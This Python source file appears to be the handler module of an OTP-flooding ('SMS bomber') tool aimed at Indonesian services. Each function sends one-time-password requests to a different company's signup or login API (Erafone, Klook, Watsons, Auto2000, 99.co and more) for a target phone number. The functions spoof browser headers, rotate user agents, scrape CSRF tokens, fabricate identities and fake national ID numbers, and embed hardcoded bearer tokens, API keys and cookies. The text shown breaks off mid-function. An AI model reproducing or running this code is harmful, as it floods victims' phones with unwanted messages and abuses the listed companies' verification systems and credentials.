#!/usr/bin/env python3

import requests
import uuid
import random
import string
import time
import re
import urllib.parse
import json

from utils import fmt_08, fmt_nocode, fmt_plus, fmt_phone_only, get_public_ip, extract_csrf, get_random_user_agent, get_headers_with_random_ua

RATE_LIMIT_KEYWORDS = ['rate limit', 'too many', 'try again', 'limit', 'exceeded', 'banned', 'blocked']

# ==================== HANDLER 1: HRS-BRE ====================
def send_hrsbre_otp(phone_08):
    BASE_URL = "https://career.hrs-bre.site"
    SIGN_UP_PAGE = f"{BASE_URL}/auth/sign_up"
    SIGN_UP_URL = f"{BASE_URL}/auth/sign_up_action"
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
        "Origin": "https://career.hrs-bre.site",
        "Referer": SIGN_UP_PAGE,
        "Upgrade-Insecure-Requests": "1",
        "Cache-Control": "max-age=0",
        "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
    }
    session = requests.Session()
    try:
        r = session.get(SIGN_UP_PAGE, headers=headers, timeout=15)
        if r.status_code != 200:
            return None, None
    except Exception as e:
        return None, None
    nik = ''.join(random.choices(string.digits, k=16))
    email = ''.join(random.choices(string.ascii_lowercase, k=8)) + "@" + random.choice(["gmail.com", "yahoo.com", "mailnesia.com"])
    username = ''.join(random.choices(string.ascii_letters, k=8))
    password = 'Aa1' + ''.join(random.choices(string.ascii_letters + string.digits + "#$%&!", k=7))
    boundary = "----WebKitFormBoundary" + ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="nik"\r\n\r\n{nik}\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="email"\r\n\r\n{email}\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="whatsapp"\r\n\r\n{phone_08}\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="username"\r\n\r\n{username}\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="password"\r\n\r\n{password}\r\n'
        f"--{boundary}--\r\n"
    )
    headers["Content-Type"] = f"multipart/form-data; boundary={boundary}"
    try:
        resp = session.post(SIGN_UP_URL, headers=headers, data=body, timeout=15)
        return resp.status_code, resp.text
    except Exception as e:
        return None, None

# ==================== HANDLER 2: ERAFONE ====================
def send_erafone_otp(phone_number):
    API_URL = "https://jeanne.eraspace.com/customers/v2.1/otp/request"
    headers = {
        "Host": "jeanne.eraspace.com",
        "otp-client": "erafone",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
        "sec-ch-ua-platform": '"Android"',
        "Authorization": "Basic Y3VzdGJhc2ljOk9MV2llWlVvQlA=",
        "otp-provider": "whatsapp",
        "signature": "d2afc6a94fc469d0633f477ed2a73a155bc379d8d138d5e9885a2b612bb3d077",
        "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
        "sec-ch-ua-mobile": "?1",
        "source": "erafone",
        "device-id": "c1aab237-131a-4965-9838-116eb9788000",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "sms-client": "erafone",
        "platform": "erafone-web",
        "Origin": "https://erafone.com",
        "Referer": "https://erafone.com/",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
    }
    payload = {
        "identifier": phone_number,
        "type": "identifier_validation"
    }
    try:
        resp = requests.post(API_URL, headers=headers, json=payload, timeout=15)
        return resp.status_code, resp.json() if resp.headers.get('content-type','').startswith('application/json') else resp.text
    except Exception as e:
        return None, {"error": str(e)}

# ==================== HANDLER 3: PLANETBAN ====================
def send_planetban_otp(phone_number):
    url = "https://api.planetban.com/website/customer/request-otp"
    headers = {
        "Content-Type": "application/json",
        "Origin": "https://planetban.com",
        "User-Agent": get_random_user_agent(),
        "Accept": "application/json, text/plain, */*",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
        "Connection": "keep-alive",
    }
    payload = {
        "name": "Test",
        "phone": phone_number,
        "password": "Test123",
        "purpose": "register",
        "method": "whatsapp"
    }
    try:
        session = requests.Session()
        session.headers.update(headers)
        resp = session.post(url, json=payload, timeout=15)
        return resp
    except Exception as e:
        return None

# ==================== HANDLER 4: TUNEUP ====================
def send_tuneup_otp(phone_number):
    url = "https://api.tuneup.id/v1/mitra/register/send-otp"
    headers = {
        "Origin": "https://dashboard.tuneup.id",
        "Referer": "https://dashboard.tuneup.id/",
        "User-Agent": get_random_user_agent(),
        "Accept": "application/json, text/plain, */*",
        "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
        "sec-ch-ua-platform": '"Android"',
        "sec-ch-ua-mobile": "?1",
    }
    name = ''.join(random.choices(string.ascii_lowercase, k=8))
    company = "PT " + name.capitalize()
    data = {
        "company_name": company,
        "owner_name": name.capitalize(),
        "address": ''.join(random.choices(string.ascii_letters + string.digits, k=10)),
        "email": name + "@mailnesia.com",
        "phone_number": phone_number,
        "province_code": "32",
        "city_code": "32.04",
        "subscription_id": "undefined",
        "channel": "whatsapp",
        "agreement": "true",
        "service_categories[]": "3",
    }
    resp = requests.post(url, data=data, headers=headers, timeout=15)
    return resp

# ==================== HANDLER 5: HASHMICRO ====================
def generate_hashmicro_payload(phone_number):
    name = 'User' + ''.join(random.choices(string.ascii_letters, k=5))
    email = f'{name.lower()}@gmail.com'
    company = 'PT ' + name
    return {
        'medium':'55','type_button':'mulai-konsultasi','fullname':name,
        'phonenumber':phone_number,'email':email,'companyname':company,
        'company_size':'small','solution':'43','industry':random.choice(['178','179','180']),
        'message':'Test','country':'100','clr_id':random.choice(['mq51xj8x-WzwfG4IcQKi0c056','abc123']),
        'campaigndata':'HashMicro','fvis':'https://www.hashmicro.com/?utm_source=chatgpt.com',
        'sfpvis':'https://www.hashmicro.com/?utm_source=chatgpt.com',
        'blvis':'https://www.hashmicro.com/id/terimakasih/','gclid':'','gbraid':'','wbraid':'',
        'campaign':'','pmax_counter':'0','ads_counter':'0','sitelink_counter':'0','fbads_counter':'0',
        'blog_counter':'0','gdn_counter':'0','source':'143',
        'user_agent':'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36',
        'duration_page':str(random.randint(100000,900000)),'blp_medium':'120','user_device':'mobile',
        'scroll_depth':'100','userjourney':time.strftime('%Y-%m-%dT%H:%M:%S.000Z') + ' | /id/tour-produk-gratis/',
        'visitorcountry':'100','lvis':'https://www.hashmicro.com/id/tour-produk-gratis/?medium=web-form-header',
        'hmregion':'','conversion_tracked':'Yes','fingerprint':uuid.uuid4().hex,'scale':'small',
        'position':'43','team':'6','honeypot':'','ipaddrs':get_public_ip(),'uip':get_public_ip(),
        'OngoingId':'','provn':'Jakarta'
    }

def send_hashmicro_otp(phone_number):
    return generate_hashmicro_payload(phone_number)

# ==================== HANDLER 6: KLOOK ====================
def send_klook_otp(phone_number):
    formatted = phone_number
    url = "https://www.klook.com/v2/userapisrv/public/verification/code/send?trace_id=" + str(uuid.uuid4())
    headers = {
        "Host": "www.klook.com",
        "x-klook-user-residence": "15_SG",
        "sec-ch-ua-platform": "\"Android\"",
        "sec-ch-ua": "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
        "x-klook-request-id": str(uuid.uuid4())[:12].replace('-','')[:6] + "_" + str(uuid.uuid4())[:6].replace('-',''),
        "sec-ch-ua-mobile": "?1",
        "baggage": "sentry-environment=production,sentry-release=usercenter_20260604_684061b7,sentry-public_key=d39c561235fbd838c4dc84cd11977fb9,sentry-trace_id=0aad749014c94a31be835687fe4834c7",
        "sentry-trace": "0aad749014c94a31be835687fe4834c7-865f051a00519a68",
        "x-klook-page-open-id": "",
        "x-klook-host": "www.klook.com",
        "x-requested-with": "XMLHttpRequest",
        "x-klook-traffic-channel": "aid_87721",
        "accept": "application/json, text/plain, */*",
        "content-type": "application/json",
        "token": "",
        "x-klook-affiliate-aid": "87721",
        "x-platform": "mobile",
        "cache-control": "no-cache",
        "x-klook-kepler-id": str(uuid.uuid4()),
        "accept-language": "en_SG",
        "currency": "SGD",
        "x-klook-tint": '{}',
        "user-agent": get_random_user_agent(),
        "x-klook-affiliate-pid": "",
        "x-klook-market": "global",
        "version": "5.6",
        "_pt": str(uuid.uuid4()),
        "origin": "https://www.klook.com",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://www.klook.com/en-SG/signin/?aid=87721",
    }
    cookies = {
        "kepler_id": str(uuid.uuid4()),
        "klk_currency": "SGD",
        "klk_rdc": "SG",
        "k_tff_ch": "aid_87721",
        "_gid": "GA1.2." + str(random.randint(1000000000,9999999999)),
        "klk_sessionid": "MQ." + str(uuid.uuid4().hex)[:32],
        "_ga": "GA1.1." + str(random.randint(1000000000,9999999999)) + "." + str(int(time.time())),
    }
    payload = {
        "action": "login_register",
        "type": 1,
        "rcv": formatted,
        "is_resend": False,
        "payload": {
            "mobile": formatted,
            "term_ids": [330],
            "mobile_token": "",
            "invite_code": ""
        },
        "_rc": "",
        "rcv_token": ""
    }
    resp = requests.post(url, json=payload, headers=headers, cookies=cookies, timeout=15)
    return resp

# ==================== HANDLER 7: INTERNET RAKYAT ====================
def send_internetrakyat_otp(phone_08):
    base_url = "https://internetrakyat.id"
    register_page = f"{base_url}/auth/register"
    api_url = f"{base_url}/api/app/auth/send-otp-register"

    headers = {
        "Host": "internetrakyat.id",
        "Connection": "keep-alive",
        "sec-ch-ua-platform": "\"Android\"",
        "User-Agent": get_random_user_agent(),
        "Accept": "application/json, text/plain, */*",
        "sec-ch-ua": "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
        "Content-Type": "application/json",
        "x-api-key": "280999!FTTH",
        "sec-ch-ua-mobile": "?1",
        "Origin": "https://internetrakyat.id",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": register_page,
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
    }

    session = requests.Session()
    try:
        session.get(register_page, headers={"User-Agent": get_random_user_agent()}, timeout=10)
    except:
        pass

    payload = {"phone_number": phone_08}
    try:
        resp = session.post(api_url, headers=headers, json=payload, timeout=15)
        return resp
    except:
        return None

# ==================== HANDLER 8: ULTRAMILK ====================
def send_ultramilk_register(phone_number):
    url = "https://ultramilk-clp.kata.ai/api/ultramilk/register"
    name = 'User' + ''.join(random.choices(string.ascii_lowercase, k=4))
    email = name.lower() + '@gmail.com'
    password = 'Pass' + ''.join(random.choices(string.ascii_letters + string.digits, k=6)) + '@1'
    headers = {
        "Host": "ultramilk-clp.kata.ai",
        "sec-ch-ua-platform": "\"Android\"",
        "authorization": "Bearer undefined",
        "user-agent": get_random_user_agent(),
        "accept": "application/json, text/plain, */*",
        "sec-ch-ua": "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
        "content-type": "application/json; charset=UTF-8",
        "sec-ch-ua-mobile": "?1",
        "origin": "https://www.icownicpatch.com",
        "sec-fetch-site": "cross-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://www.icownicpatch.com/",
    }
    payload = {
        "name": name,
        "email": email,
        "password": password,
        "phone_number": phone_number,
        "portal": "IcownicPatch",
        "is_consent": True
    }
    resp = requests.post(url, json=payload, headers=headers, timeout=15)
    return resp

# ==================== HANDLER 9: KANIVA ====================
def send_kaniva_otp(number_08, name):
    sess = requests.Session()
    sess.headers.update({
        "User-Agent": get_random_user_agent(),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "id,en-US;q=0.9,en;q=0.8",
    })
    try:
        r = sess.get("https://daftar.kanivainternationalbali.com/register/whatsapp", timeout=15)
        if r.status_code != 200:
            return None
    except:
        return None
    csrf = None
    match = re.search(r'<meta\s+name="csrf-token"\s+content="([^"]+)"', r.text)
    if match:
        csrf = match.group(1)
    else:
        raw = sess.cookies.get("XSRF-TOKEN", "")
        if raw:
            csrf = urllib.parse.unquote(raw)
    if not csrf:
        return None
    otp_url = "https://daftar.kanivainternationalbali.com/register/whatsapp/request-otp"
    headers_otp = {
        "X-XSRF-TOKEN": csrf,
        "X-Inertia": "true",
        "X-Inertia-Version": "56e6482206af61d5490c1118b2876044",
        "X-Requested-With": "XMLHttpRequest",
        "Content-Type": "application/json",
        "Origin": "https://daftar.kanivainternationalbali.com",
        "Referer": "https://daftar.kanivainternationalbali.com/register/whatsapp",
        "Accept": "application/json",
        "User-Agent": get_random_user_agent(),
    }
    payload = {"name": name, "phone": number_08}
    try:
        resp = sess.post(otp_url, json=payload, headers=headers_otp, timeout=15)
        return resp
    except:
        return None

# ==================== HANDLER 10: JEMBATANI ====================
def send_jembatani_otp(phone_number, name, password):
    headers = {
        "Host": "api.jembatani.co.id",
        "sec-ch-ua-platform": "\"Android\"",
        "authorization": "Bearer 4aa440574d1da1687276e697495154499b6eaf6142eaaef007271fcd840aca98",
        "user-agent": get_random_user_agent(),
        "accept": "application/json, text/plain, */*",
        "sec-ch-ua": "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
        "content-type": "application/json",
        "sec-ch-ua-mobile": "?1",
        "origin": "https://jembatani.co.id",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://jembatani.co.id/",
    }
    reg_payload = {
        "phone_number": phone_number,
        "name": name,
        "role": "farmer",
        "password": password,
        "password_confirmation": password,
        "consent": "1"
    }
    try:
        reg_resp = requests.post("https://api.jembatani.co.id/v1/register",
                                json=reg_payload, headers=headers, timeout=15)
        if reg_resp.status_code == 200 and '"success":true' in reg_resp.text:
            return reg_resp
    except:
        pass
    resend_payload = {"phone_number": phone_number}
    try:
        resend_resp = requests.post("https://api.jembatani.co.id/v1/regenerate-otp",
                                   json=resend_payload, headers=headers, timeout=15)
        return resend_resp
    except:
        return None

# ==================== HANDLER 11: RCX ====================
def send_rcx_otp(identifier, name, email):
    sess = requests.Session()
    sess.headers.update({
        "User-Agent": get_random_user_agent(),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "id,en-US;q=0.9,en;q=0.8",
    })
    try:
        reg_get = sess.get("https://sso.rcx.co.id/register", timeout=15)
        if reg_get.status_code != 200:
            return None
    except:
        return None

    token = None
    if "XSRF-TOKEN" in sess.cookies:
        token = urllib.parse.unquote(sess.cookies["XSRF-TOKEN"])
    if not token:
        match = re.search(r'<meta\s+name="csrf-token"\s+content="([^"]+)"', reg_get.text)
        if match:
            token = match.group(1)
    if not token:
        return None

    url = "https://sso.rcx.co.id/auth/passwordless/request"
    headers = {
        "Cache-Control": "max-age=0",
        "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "Upgrade-Insecure-Requests": "1",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://sso.rcx.co.id",
        "Referer": "https://sso.rcx.co.id/register",
        "User-Agent": get_random_user_agent(),
    }
    data = {
        "_token": token,
        "mode": "register",
        "channel": "whatsapp",
        "name": name,
        "email": email,
        "identifier": identifier
    }
    try:
        resp = sess.post(url, headers=headers, data=data, allow_redirects=False, timeout=15)
        return resp
    except:
        return None

# ==================== HANDLER 12: SAHABAT TEKNISI ====================
def send_sahabatteknisi_otp(phone_number):
    url = "https://www.sahabatteknisi.co.id/api/auth/otp/check-phone"
    headers = {
        "sec-ch-ua-platform": "\"Android\"",
        "x-requested-with": "XMLHttpRequest",
        "user-agent": get_random_user_agent(),
        "accept": "*/*",
        "sec-ch-ua": "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
        "content-type": "application/json",
        "sec-ch-ua-mobile": "?1",
        "origin": "https://www.sahabatteknisi.co.id",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://www.sahabatteknisi.co.id/checkout/confirm",
    }
    payload = {"phone": phone_number}
    try:
        resp = requests.post(url, json=payload, headers=headers, timeout=15)
        return resp
    except:
        return None

# ==================== HANDLER 13: AUTO2000 ====================
def send_auto2000_otp(phone_08):
    url = "https://auto2000.co.id/api/customer/v1/saphybris/whatsapp/generate-otp"
    headers = {
        "Host": "auto2000.co.id",
        "sec-ch-ua-platform": '"Android"',
        "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
        "sec-ch-ua-mobile": "?1",
        "baggage": "sentry-environment=PRD,sentry-public_key=a9168ed9e0239b8f02f772e5cb953cbf,sentry-trace_id=fa6fa6d20ca49a4b62badd288ffcfdc3,sentry-transaction=GET%20%2Flogin,sentry-sampled=true,sentry-sample_rand=0.7926218694466494,sentry-sample_rate=1",
        "sentry-trace": "fa6fa6d20ca49a4b62badd288ffcfdc3-8fe0a1fb4d2ae88a-1",
        "User-Agent": get_random_user_agent(),
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Origin": "https://auto2000.co.id",
        "Referer": "https://auto2000.co.id/login",
        "Accept-Language": "id,en-US;q=0.9,en;q=0.8,es;q=0.7,zh-CN;q=0.6,zh;q=0.5",
    }
    cookies = {
        "system_token": "UeRmUjEnH5N9FEWf1lEAFDqcJ9w",
        "__Host-next-auth.csrf-token": "244fc48aa5bc0f4b221efb6180f81783a8409eb97d7cfbd1862417ecd5e3f828%7Cafcb5605ff19e76229c125b9ddfbee2431be4cf7c369c743bec3e911e920cd22",
        "__Secure-next-auth.callback-url": "https%3A%2F%2Fauto2000.co.id",
    }
    payload = {
        "phoneNumber": phone_08,
        "isCheckOtpLimit": True,
        "uniqueID": phone_08,
        "isLogin": False
    }
    try:
        resp = requests.post(url, headers=headers, cookies=cookies, json=payload, timeout=15)
        return resp
    except:
        return None

# ==================== HANDLER 14: ASTRA DAIHATSU ====================
def send_astra_daihatsu_otp(phone_62):
    sess = requests.Session()
    sess.headers.update({
        "User-Agent": get_random_user_agent(),
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Origin": "https://www.astra-daihatsu.id",
        "Referer": "https://www.astra-daihatsu.id/register",
        "Sec-CH-UA": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
        "Sec-CH-UA-Mobile": "?1",
        "Sec-CH-UA-Platform": "Android",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "X-Requested-With": "XMLHttpRequest",
    })
    try:
        resp = sess.get("https://www.astra-daihatsu.id/register", timeout=15)
        if resp.status_code != 200:
            return None
    except:
        return None

    csrf = None
    m = re.search(r'<meta\s+name="csrf-token"\s+content="([^"]+)"', resp.text)
    if m:
        csrf = m.group(1)
    if not csrf:
        m = re.search(r'<input\s+type="hidden"\s+name="_csrf"\s+value="([^"]+)"', resp.text)
        if m:
            csrf = m.group(1)
    if not csrf:
        m = re.search(r'[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}', resp.text)
        if m:
            csrf = m.group(0)
    if not csrf:
        csrf = "c5de9b78-1136-4a89-9cbd-e9aba82dfaef"

    otp_url = "https://www.astra-daihatsu.id/otp/whatsapp/generate"
    headers_otp = {
        "Content-Type": "application/json; charset=UTF-8",
        "csrftoken": csrf,
        "Origin": "https://www.astra-daihatsu.id",
        "Referer": "https://www.astra-daihatsu.id/register",
        "User-Agent": get_random_user_agent(),
    }
    payload = {"phoneNo": phone_62}
    try:
        resp = sess.post(otp_url, headers=headers_otp, json=payload, timeout=20)
        return resp
    except:
        return None

# ==================== HANDLER 15: ROYAL CANIN ====================
def send_royal_canin_otp(phone_plus):
    sess = requests.Session()
    sess.headers.update({
        "Host": "club.royalcanin.id",
        "sec-ch-ua-platform": '"Android"',
        "User-Agent": get_random_user_agent(),
        "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
        "content-type": "application/json",
        "sec-ch-ua-mobile": "?1",
        "accept": "*/*",
        "origin": "https://club.royalcanin.id",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
    })
    try:
        resp = sess.get("https://club.royalcanin.id/sign-up", timeout=15)
        if resp.status_code != 200:
            return None
    except:
        return None

    otp_url = "https://club.royalcanin.id/api/get_otp"
    payload = {
        "params": {
            "Email": "",
            "mobile_number": phone_plus,
            "OTPType": "IM"
        }
    }
    try:
        resp = sess.post(otp_url, json=payload, timeout=20)
        return resp
    except:
        return None

# ==================== HANDLER 16: WATSONS ====================
def send_watsons_otp(phone_no_code):
    url = "https://api.watsons.co.id/api/v2/wtcid/otpToken?formId=registrationOTPForm_Web3&lang=id&curr=IDR"
    headers = {
        "Host": "api.watsons.co.id",
        "cache-control": "no-cache, no-store, must-revalidate, post-check=0, pre-check=0",
        "sec-ch-ua-platform": "\"Android\"",
        "authorization": "bearer Pi_D6dqblYElXgy4mWOXjkLCaZg",
        "pragma": "no-cache",
        "sec-ch-ua": "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
        "sec-ch-ua-mobile": "?1",
        "expires": "0",
        "queue-target": "https://www.watsons.co.id/id/register",
        "user-agent": get_random_user_agent(),
        "if-modified-since": "Fri, 19 Jun 2026 15:39:26 GMT",
        "accept": "application/json, text/plain, */*",
        "content-type": "application/json",
        "vary": "*",
        "origin": "https://www.watsons.co.id",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://www.watsons.co.id/",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
    }
    cookies = {
        "authorization": "Pi_D6dqblYElXgy4mWOXjkLCaZg",
        "token_type": "guest",
        "PIM-SESSION-ID": "fFENbGdcaOZMa62p",
    }
    payload = {
        "uid": "",
        "action": "GENERAL",
        "countryCode": "62",
        "target": phone_no_code,
        "type": "WHATSAPP"
    }
    try:
        resp = requests.post(url, headers=headers, cookies=cookies, json=payload, timeout=15)
        return resp
    except:
        return None

# ==================== HANDLER 17: 99.CO ====================
def send_99co_otp(phone_plus):
    token_static = "eyJhbGciOiJFUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJybzJ6ZThOYkFNUW1QTlVVZFcwTjItNnE5bWNleHJHcHdFNS0xd3hQQWJzIn0.eyJleHAiOjE3ODEwOTA1MTQsImlhdCI6MTc4MTA4NjkxNCwianRpIjoiMWJmMjAxNDQtM2EyOS00MzJkLWIyYmItNGYxOTlmMTIzMGM4IiwiaXNzIjoiaHR0cHM6Ly9rZXljbG9hay1pZC45OS5jby9yZWFsbXMvOTlpZC1wcm9kIiwic3ViIjoiOTQ1MmE5MjgtNjkzZS00OWIxLWEzOTUtNGMwMThlNmQ3MTg0IiwidHlwIjoiQmVhcmVyIiwiYXpwIjoiZnJvbnRlbmQtYXBwIiwic2Vzc2lvbl9zdGF0ZSI6ImFlYTNhMDEzLTJmMDktNDU0Ni05M2Q5LWM1MmVkYWRiMGM0NSIsImFjciI6IjEiLCJyZWFsbV9hY2Nlc3MiOnsicm9sZXMiOlsic2VsbGVyIiwidW1hX2F1dGhvcml6YXRpb24iLCJkZWZhdWx0LXJvbGVzLTk5aWQtcHJvZCIsImJ1eWVyIl19LCJzY29wZSI6InByb2ZpbGUtbWluaW1pemUgY29yZS11dWlkIGVtYWlsIiwic2lkIjoiYWVhM2EwMTMtMmYwOS00NTQ2LTkzZDktYzUyZWRhZGIwYzQ1IiwiY29yZV91dWlkIjoiMmI4OTg0MzQtMjE3MC00MGRmLTgwNmYtN2I4ZWNjOGUwZjQ4IiwiZW1haWxfdmVyaWZpZWQiOmZhbHNlLCJjb3JlX2NvbnN1bWVyX3V1aWQiOiIxOGU5ODcyMy0wOWY5LTRlMzEtYjQzYS1jOGVlMjAwZWVmNWIiLCJwcmVmZXJyZWRfdXNlcm5hbWUiOiJoc2hoc2pzajEyMiIsImNvcmVfY3VzdG9tZXJfdXVpZCI6ImQ5MTI3NDBkLWNhYzYtNDYyYS04YmE1LTMzYWE1MDc2MDdjMiIsImVtYWlsIjoidHN0dHR0dHRndHR0QGdtYWlsLmNvbSJ9.CcZpFr2eggmtVoWpUPuWTYg2LQ-qxH0GV4yx9q1_ZnB4pt13JIbTclvEytnqdLl9w9d8BKzCeGIiEnf0oQZpbw"
    url = "https://www.99.co/id/api/biz/messaging/otp-events"
    sess = requests.Session()
    sess.headers.update({
        "User-Agent": get_random_user_agent(),
        "Accept-Language": "id,en-US;q=0.9",
        "Origin": "https://www.99.co",
        "Referer": "https://www.99.co/id?utm_source=chatgpt.com",
    })
    try:
        r = sess.get("https://www.99.co/id?utm_source=chatgpt.com", timeout=10)
        token_cookie = sess.cookies.get("_99-acs-token")
        if token_cookie:
            token = token_cookie
        else:
            token = token_static
    except:
        token = token_static

    headers = {
        "Host": "www.99.co",
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "Origin": "https://www.99.co",
        "Referer": "https://www.99.co/id?utm_source=chatgpt.com",
        "User-Agent": sess.headers.get("User-Agent"),
        "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
        "sec-ch-ua-platform": '"Android"',
        "sec-ch-ua-mobile": "?1",
    }
    payload = {
        "brand": "99id",
        "destination_address": phone_plus,
        "type_id": 2
    }
    return sess.post(url, headers=headers, json=payload, timeout=15)

# ==================== HANDLER 18: BELIRUMAH.CO ====================
def send_belirumah_otp(phone_plus):
    url = "https://api.belirumah.co/api/otp/request_new"
    headers = {
        "Host": "api.belirumah.co",
        "sec-ch-ua-platform": "\"Android\"",
        "User-Agent": get_random_user_agent(),
        "Accept": "application/json, text/plain, */*",
        "sec-ch-ua": "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
        "Content-Type": "application/json",
        "sec-ch-ua-mobile": "?1",
        "Origin": "https://belirumah.co",
        "Sec-Fetch-Site": "same-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://belirumah.co/",
    }
    payload = {"phone_number": phone_plus}
    return requests.post(url, json=payload, headers=headers, timeout=15)

# ==================== HANDLER 19: FASTWORK.ID ====================
def send_fastwork_otp(phone_08):
    url = "https://api.fastwork.id/auth/v2/signup.sendVerificationCode"
    headers = {
        "Host": "api.fastwork.id",
        "sec-ch-ua-platform": "\"Android\"",
        "user-agent": get_random_user_agent(),
        "sec-ch-ua": "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
        "content-type": "application/json",
        "sec-ch-ua-mobile": "?1",
        "accept": "*/*",
        "origin": "https://fastwork.id",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://fastwork.id/",
    }
    payload = {"phone_number": phone_08}
    return requests.post(url, json=payload, headers=headers, timeout=15)

# ==================== HANDLER 20: BEAUTYHAUL ====================
def send_beautyhaul_otp(local_number):
    base = "https://www.beautyhaul.com"
    nama_depan = ''.join(random.choices(string.ascii_lowercase, k=5)).capitalize()
    nama_belakang = ''.join(random.choices(string.ascii_lowercase, k=5)).capitalize()
    rand_email = f"{nama_depan.lower()}{random.randint(100,999)}@gmail.com"
    password = "Testt#12334"

    reg_payload = {
        "nama_depan": nama_depan,
        "nama_belakang": nama_belakang,
        "email": rand_email,
        "nomor_kode_id": "100",
        "nomor_kode_value": "62",
        "nomor_ponsel": local_number,
        "password": password,
        "konfirmasi_password": password,
        "tanggal_lahir": "20 Jun 2015",
        "jenis_kelamin": random.choice(["Female", "Male"]),
        "g-recaptcha-response": "",
        "subscribe": "true",
        "terms": "true"
    }

    bh_session = requests.Session()
    bh_session.headers.update({
        "host": "www.beautyhaul.com",
        "sec-ch-ua-platform": "\"Android\"",
        "user-agent": get_random_user_agent(),
        "accept": "application/json, text/plain, */*",
        "sec-ch-ua": "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
        "content-type": "application/json",
        "sec-ch-ua-mobile": "?1",
        "origin": "https://www.beautyhaul.com",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
